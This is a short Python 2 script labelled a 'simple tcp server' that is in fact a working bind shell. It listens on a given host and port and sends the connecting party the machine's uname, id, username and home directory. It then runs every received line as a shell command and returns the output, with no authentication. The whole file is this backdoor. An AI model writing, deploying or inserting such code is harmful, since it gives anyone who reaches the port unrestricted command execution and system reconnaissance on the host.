#!/usr/bin/env python
##
# simple tcp server using 'commands' library
##

import os, sys
import socket
import commands

socksize = 4096
info = {
    'uname': commands.getoutput('uname -ar'),
    'uid': commands.getoutput('id'),
    'user': os.environ['USERNAME'],
    'home': os.environ['HOME']
}

def bind(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((host, port))
        server.listen(5)
    except:
        sys.exit(1)

    conn, addr = server.accept()
    for k, v in info.iteritems():
        conn.sendall('%s\t%s' % (k, v))
    conn.sendall("\nshell >> ")
    while True:
        cmd = conn.recv(socksize)
        if cmd.strip("\n") == "quit!":
            conn.close()
            sys.exit()
        else:
            out = commands.getoutput(cmd.strip("\n"))
            conn.sendall(out)
            conn.sendall("\nshell >> ")

    conn.close()
    sys.exit()

try:
    host, port = sys.argv[1], sys.argv[2]
    bind(host, int(port))
except:
    print("usage: ./tcp.py <host> <port>")
    sys.exit(1)

